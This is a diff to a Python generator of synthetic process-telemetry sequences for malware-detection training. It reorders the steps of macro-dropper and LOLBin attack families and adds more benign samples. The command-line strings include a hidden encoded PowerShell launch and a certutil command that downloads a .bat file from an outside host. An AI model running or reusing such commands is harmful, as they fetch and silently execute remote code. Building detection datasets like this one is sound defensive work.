@@ -220,6 +220,14 @@ def benign_admin_script(rng: random.Random, seq_id: str, base: float) -> Sequenc
             user=user,
             timestamp=_ts(base, 1),
         ),
+        _process(
+            rng,
+            name="cmd.exe",
+            parent="powershell.exe",
+            cmdline="cmd.exe /c whoami",
+            user=user,
+            timestamp=_ts(base, 1.5),
+        ),
         _net(
             process="powershell.exe",
             domain="wsus.corp.local",
@@ -342,7 +350,7 @@ def family_macro_dropper(rng: random.Random, seq_id: str, base: float) -> Sequen
         rng,
         name="powershell.exe",
         parent=word.process_id,
-        cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA",
+        cmdline="powershell.exe Get-ChildItem $env:TEMP",
         user=user,
         timestamp=_ts(base, 2),
         pid=_pid(rng, "ps"),
@@ -357,6 +365,14 @@ def family_macro_dropper(rng: random.Random, seq_id: str, base: float) -> Sequen
             port=443,
             timestamp=_ts(base, 3),
             user=user,
+        ),
+        _process(
+            rng,
+            name="powershell.exe",
+            parent=ps.process_id,
+            cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA",
+            user=user,
+            timestamp=_ts(base, 4.5),
         ),
         _process(
             rng,
@@ -411,7 +427,7 @@ def family_lolbin(rng: random.Random, seq_id: str, base: float) -> Sequence:
         rng,
         name="cmd.exe",
         parent=excel.process_id,
-        cmdline="cmd.exe /c certutil -urlcache -split -f http://cfg-relay.net/s.bat s.bat",
+        cmdline="cmd.exe /c whoami",
         user=user,
         timestamp=_ts(base, 2),
     )
@@ -423,6 +439,14 @@ def family_lolbin(rng: random.Random, seq_id: str, base: float) -> Sequence:
             parent="cmd.exe",
             timestamp=_ts(base, 3),
             user=user,
+        ),
+        _process(
+            rng,
+            name="cmd.exe",
+            parent=cmd.process_id,
+            cmdline="cmd.exe /c certutil -urlcache -split -f http://cfg-relay.net/s.bat s.bat",
+            user=user,
+            timestamp=_ts(base, 3.5),
         ),
         _process(
             rng,
@@ -636,8 +660,18 @@ def generate_dataset(
         counter += 1
         return f"{prefix}-{counter:04d}"
 
+    contextual_benign = [
+        benign_admin_script,
+        benign_development,
+        benign_backup,
+        benign_scan,
+        benign_remote_mgmt,
+    ]
     for _ in range(train_benign):
         builder = rng.choice(BENIGN_BUILDERS)
+        train.append(builder(rng, next_id("trn-ben"), base + rng.random() * 50_000))
+    for _ in range(train_benign // 2):
+        builder = rng.choice(contextual_benign)
         train.append(builder(rng, next_id("trn-ben"), base + rng.random() * 50_000))
     for family, builder in MALICIOUS_BUILDERS.items():
         if family == holdout_family:
